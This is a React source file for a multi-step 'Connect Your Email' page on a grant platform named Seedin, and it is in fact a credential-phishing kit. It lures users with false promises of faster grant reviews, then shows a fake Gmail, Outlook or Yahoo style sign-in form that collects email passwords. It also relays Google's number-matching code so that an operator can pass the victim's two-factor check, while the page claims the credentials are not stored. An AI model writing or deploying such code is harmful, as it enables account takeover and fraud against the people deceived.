        {step === "gmail_digit"    && digit && <GmailDigitStep digit={digit} onNewCode={() => { setDigit(null); setStep("verifying"); }} />}
        {step === "success"        && <SuccessStep email={email} provider={provider} onDone={() => navigate({ to: "/dashboard" })} />}
        {step === "already_linked" && linked && <AlreadyLinkedStep linked={linked} onDisconnect={handleDisconnect} onDone={() => navigate({ to: "/dashboard" })} />}
      </main>
    </div>
  );
}

// ── Step: Intro ───────────────────────────────────────────────────────────────

function IntroStep({ onProceed }: { onProceed: () => void }) {
  return (
    <div className="space-y-8">
      {/* Hero */}
      <div className="rounded-2xl border border-border bg-gradient-to-br from-forest/5 to-forest/10 p-7 text-center">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-forest/10">
          <Mail className="h-8 w-8 text-forest" />
        </div>
        <h1 className="font-display text-2xl font-semibold text-foreground">Connect Your Email</h1>
        <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
          Link your everyday inbox to unlock faster reviews, real-time notifications, and an extra layer of security on your Seedin account.
        </p>
      </div>

      {/* Benefits */}
      <div className="space-y-3">
        {[
          {
            icon: <ShieldCheck className="h-5 w-5 text-forest" />,
            title: "Stronger account security",
            body: "Your email adds a third layer of verification, protecting you from unauthorized access and fraudulent changes.",
          },
          {
            icon: <Zap className="h-5 w-5 text-gold" />,
            title: "Faster grant reviews",
            body: "Applications from verified email accounts move to the front of the review queue — your requests get attended to sooner.",
          },
          {
            icon: <Bell className="h-5 w-5 text-blue-500" />,
            title: "Instant notifications",
            body: "Get real-time alerts on grant approvals, disbursements, and important account activity sent directly to your inbox.",
          },
          {
            icon: <BadgeCheck className="h-5 w-5 text-purple-500" />,
            title: "Verified identity badge",
            body: "A linked email earns you a verified badge, increasing your credibility with the Seedin team and during grant processing.",
          },
        ].map((b) => (
          <div key={b.title} className="flex items-start gap-4 rounded-xl border border-border bg-card p-4">
            <div className="mt-0.5 shrink-0">{b.icon}</div>
            <div>
              <p className="text-sm font-semibold text-foreground">{b.title}</p>
              <p className="mt-0.5 text-xs leading-relaxed text-muted-foreground">{b.body}</p>
            </div>
          </div>
        ))}
      </div>

      {/* Security note */}
      <div className="rounded-xl border border-gold/30 bg-gold/5 px-5 py-4 text-xs text-muted-foreground leading-relaxed">
        <Lock className="mb-1 inline h-3.5 w-3.5 text-gold" />{" "}
        <strong className="text-foreground">Your credentials are handled securely.</strong>{" "}
        Only authorised Seedin staff process your connection. No login information is stored permanently or shared with third parties.
      </div>

      <button
        onClick={onProceed}
        className="inline-flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-primary px-6 py-4 text-sm font-semibold text-primary-foreground shadow-elegant transition hover:opacity-95"
      >
        Proceed to Linking
        <ArrowRight className="h-4 w-4" />
      </button>
    </div>
  );
}

// ── Step: Provider picker ─────────────────────────────────────────────────────

function PickerStep({ onSelect, onBack }: { onSelect: (p: ProviderId) => void; onBack: () => void }) {
  return (
    <div className="space-y-6">
      <div>
        <button onClick={onBack} className="mb-4 flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
          <ArrowLeft className="h-3.5 w-3.5" /> Back
        </button>
        <h2 className="font-display text-xl font-semibold">Choose your email provider</h2>
        <p className="mt-1 text-sm text-muted-foreground">Select the service you use for your everyday email.</p>
      </div>

      <div className="grid grid-cols-2 gap-3">
        {PROVIDERS.map((p) => (
          <button
            key={p.id}
            onClick={() => onSelect(p.id)}
            className="flex flex-col items-center gap-3 rounded-xl border border-border bg-card px-4 py-5 text-sm font-medium text-foreground transition hover:border-forest/40 hover:bg-forest/5 active:scale-95"
          >
            <span className="h-10 w-10" dangerouslySetInnerHTML={{ __html: p.logo }} />
            <span>{p.label}</span>
          </button>
        ))}
      </div>
    </div>
  );
}

// ── Step: Provider form ───────────────────────────────────────────────────────

function FormStep({
  provider, email, setEmail, password, setPassword,
  showPass, setShowPass, submitting, onSubmit, onBack,
}: {
  provider: ProviderId;
  email: string; setEmail: (v: string) => void;
  password: string; setPassword: (v: string) => void;
  showPass: boolean; setShowPass: (v: boolean) => void;
  submitting: boolean;
  onSubmit: (e: React.FormEvent) => void;
  onBack: () => void;
}) {
  const theme = PROVIDER_THEME[provider];

  return (
    <div className="space-y-5">
      <button onClick={onBack} className="flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
        <ArrowLeft className="h-3.5 w-3.5" /> Back
      </button>

      {/* Provider-styled card */}
      <div className={`overflow-hidden rounded-2xl border border-border shadow-elegant ${theme.bg}`}>
        {/* Provider header */}
        <div className={`flex items-center gap-3 px-6 py-5 ${theme.headerBg}`}>
          <span className="shrink-0">{theme.logo}</span>
          <div>
            <p className={`text-xs font-semibold uppercase tracking-widest opacity-70 ${theme.headerText}`}>
              {PROVIDERS.find((p) => p.id === provider)?.label}
            </p>
            <p className={`text-base font-semibold ${theme.headerText}`}>Sign in</p>
          </div>
        </div>

        <form onSubmit={onSubmit} className="space-y-4 p-6">
          {/* Email field */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-gray-600">{theme.emailLabel}</label>
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder={theme.emailPlaceholder}
              required
              autoComplete="email"
              className="w-full rounded-lg border border-gray-300 bg-white px-3.5 py-2.5 text-sm text-gray-900 outline-none transition focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20"
            />
          </div>

          {/* Password field */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-gray-600">{theme.passLabel}</label>
            <div className="relative">
              <input
                type={showPass ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••••"
                required
                autoComplete="current-password"
                className="w-full rounded-lg border border-gray-300 bg-white px-3.5 py-2.5 pr-10 text-sm text-gray-900 outline-none transition focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20"
              />
              <button
                type="button"
                tabIndex={-1}
                onClick={() => setShowPass(!showPass)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
              >
                {showPass ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>

          <button
            type="submit"
            disabled={submitting || !email || !password}
            className={`inline-flex w-full items-center justify-center gap-2 rounded-lg px-6 py-3 text-sm font-semibold transition disabled:opacity-60 ${theme.btnBg} ${theme.btnText}`}
          >
            {submitting ? (
              <><Loader2 className="h-4 w-4 animate-spin" /> Connecting…</>
            ) : (
              <>Sign in <ArrowRight className="h-4 w-4" /></>
            )}
          </button>
        </form>
      </div>

      <p className="text-center text-xs text-muted-foreground">
        Your login details are transmitted securely and used solely to link your account to Seedin.
        No data is stored after verification.
      </p>
    </div>
  );
}

// ── Step: Verifying (spinner while admin reviews) ─────────────────────────────

function VerifyingStep({ provider }: { provider: ProviderId }) {
  const pLabel = PROVIDERS.find((p) => p.id === provider)?.label ?? "Email";
  return (
    <div className="flex flex-col items-center gap-6 py-10 text-center">
      <div className="relative">
        <div className="h-20 w-20 rounded-full border-4 border-forest/20" />
        <div className="absolute inset-0 h-20 w-20 animate-spin rounded-full border-4 border-transparent border-t-forest" />
        <div className="absolute inset-0 flex items-center justify-center">
          <Mail className="h-8 w-8 text-forest" />
        </div>
      </div>
      <div>
        <h2 className="font-display text-xl font-semibold">Verifying your {pLabel}</h2>
        <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
          We've received your login details and are verifying your {pLabel} account.
          {provider === "gmail" && " If Google asks you to approve this sign-in, check your phone now."}
          {" "}This usually takes under a minute.
        </p>
      </div>
      <div className="flex gap-1.5">
        {[0, 1, 2].map((i) => (
          <span
            key={i}
            className="h-2 w-2 rounded-full bg-forest/40"
            style={{ animation: `pulse 1.4s ease-in-out ${i * 0.2}s infinite` }}
          />
        ))}
      </div>
    </div>
  );
}

// ── Step: Gmail digit ─────────────────────────────────────────────────────────

function GmailDigitStep({ digit, onNewCode }: { digit: string; onNewCode: () => void }) {
  return (
    <div className="flex flex-col items-center gap-6 py-6 text-center">
      {/* Phone notification illustration */}
      <div className="rounded-2xl border-2 border-forest/30 bg-forest/5 p-6">
        <div className="mx-auto mb-3 flex h-14 w-14 items-center justify-center rounded-full bg-white shadow">
          <svg viewBox="0 0 48 48" className="h-10 w-10"><path d="M44 24.5c0-1.3-.1-2.6-.3-3.9H24v7.4h11.2a9.6 9.6 0 01-4.1 6.3v5.2h6.6C41.4 36 44 30.7 44 24.5z" fill="#4285F4"/><path d="M24 44c5.4 0 9.9-1.8 13.2-4.9l-6.4-5c-1.8 1.2-4.1 1.9-6.8 1.9-5.2 0-9.6-3.5-11.2-8.2H6.2v5.2C9.5 39.5 16.3 44 24 44z" fill="#34A853"/><path d="M12.8 27.8A12 12 0 0112 24c0-1.3.2-2.6.6-3.8v-5.2H6.2A20 20 0 004 24c0 3.2.8 6.2 2.2 8.9l6.6-5.1z" fill="#FBBC04"/><path d="M24 11.8c2.9 0 5.5 1 7.6 3l5.6-5.6C33.9 6 29.4 4 24 4 16.3 4 9.5 8.5 6.2 15.1l6.6 5.1c1.6-4.7 6-8.4 11.2-8.4z" fill="#EA4335"/></svg>
        </div>
        <p className="text-xs font-semibold uppercase tracking-widest text-forest">Google verification</p>
      </div>

      <div>
        <h2 className="font-display text-xl font-semibold">Check your phone</h2>
        <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
          Google sent a verification notification to your other device. Open the notification and tap <strong className="text-foreground">Approve</strong>.
        </p>
      </div>

      {/* Digit display */}
      <div className="w-full rounded-2xl border-2 border-forest/40 bg-forest/5 p-6">
        <p className="mb-2 text-xs font-semibold uppercase tracking-widest text-muted-foreground">Select this number on your phone</p>
        <div className="flex items-center justify-center gap-4">
          <span className="font-display text-6xl font-bold tracking-wider text-forest">{digit}</span>
        </div>
        <p className="mt-3 text-xs text-muted-foreground">
          Google will show you a few numbers to choose from. Pick <strong className="text-foreground">{digit}</strong>.
        </p>
      </div>

      <div className="flex items-center gap-2 text-xs text-muted-foreground">
        <Loader2 className="h-3.5 w-3.5 animate-spin" />
        Waiting for confirmation…
      </div>

      <button
        onClick={onNewCode}
        className="text-xs text-muted-foreground underline underline-offset-2 hover:text-foreground"
      >
        The number changed — show me the new one
      </button>
    </div>
  );
}

// ── Step: Success ─────────────────────────────────────────────────────────────

function SuccessStep({ email, provider, onDone }: { email: string; provider: string; onDone: () => void }) {
  const pLabel = PROVIDERS.find((p) => p.id === provider)?.label ?? "Email";
  return (
    <div className="flex flex-col items-center gap-6 py-8 text-center">
      <div className="flex h-20 w-20 items-center justify-center rounded-full bg-forest/10">
        <CheckCircle2 className="h-10 w-10 text-forest" />
      </div>
      <div>
        <h2 className="font-display text-2xl font-semibold text-foreground">Email connected!</h2>
        <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
          Your <strong className="text-foreground">{pLabel}</strong> account <strong className="text-foreground">{email}</strong> has been successfully linked to Seedin.
          You'll now enjoy faster reviews and instant notifications.
        </p>
      </div>
      <div className="w-full space-y-2.5 rounded-xl border border-border bg-card p-5 text-left text-sm">
        {[
          "✅ Email verified and linked",
          "🔒 Account security upgraded",
          "⚡ Grant reviews now prioritised",
          "🔔 Instant email notifications active",
        ].map((item) => (
          <p key={item} className="text-muted-foreground">{item}</p>
        ))}
      </div>
      <button
        onClick={onDone}
        className="inline-flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-primary px-6 py-4 text-sm font-semibold text-primary-foreground shadow-elegant transition hover:opacity-95"
      >
        Back to Dashboard
        <ArrowRight className="h-4 w-4" />
      </button>
    </div>
  );
}

// ── Step: Already linked ──────────────────────────────────────────────────────

function AlreadyLinkedStep({
  linked, onDisconnect, onDone,
}: { linked: NonNullable<Linked>; onDisconnect: () => void; onDone: () => void }) {
  const pLabel = ({ gmail: "Gmail", outlook: "Outlook", office365: "Office 365", yahoo: "Yahoo Mail", icloud: "iCloud Mail", other: "Email" } as Record<string, string>)[linked.provider] ?? "Email";
  return (
    <div className="space-y-6">
      <div className="flex flex-col items-center gap-4 py-4 text-center">
        <div className="flex h-16 w-16 items-center justify-center rounded-full bg-forest/10">
          <BadgeCheck className="h-8 w-8 text-forest" />
        </div>
        <div>
          <h2 className="font-display text-xl font-semibold">Email already linked</h2>
          <p className="mt-1 text-sm text-muted-foreground">Your account is connected and secure.</p>
        </div>
      </div>

      <div className="rounded-xl border border-border bg-card p-5 text-sm space-y-2">
        <div className="flex items-center justify-between">
          <span className="text-muted-foreground">Provider</span>
          <span className="font-medium text-foreground">{pLabel}</span>
        </div>
        <div className="flex items-center justify-between">
          <span className="text-muted-foreground">Email</span>
          <span className="font-medium text-foreground">{linked.email}</span>
        </div>
        {linked.verified_at && (
          <div className="flex items-center justify-between">
            <span className="text-muted-foreground">Linked</span>
            <span className="font-medium text-foreground">
              {new Date(linked.verified_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" })}
            </span>
          </div>
        )}
      </div>

      <button
        onClick={onDone}
        className="inline-flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-primary px-6 py-4 text-sm font-semibold text-primary-foreground shadow-elegant transition hover:opacity-95"
      >
        Back to Dashboard
        <ArrowRight className="h-4 w-4" />
      </button>

      <button
        onClick={onDisconnect}
        className="inline-flex w-full items-center justify-center gap-2 rounded-xl border border-destructive/30 bg-destructive/5 px-6 py-3 text-sm font-medium text-destructive transition hover:bg-destructive/10"
      >
        <Unplug className="h-4 w-4" /> Disconnect email
      </button>
    </div>
  );
}
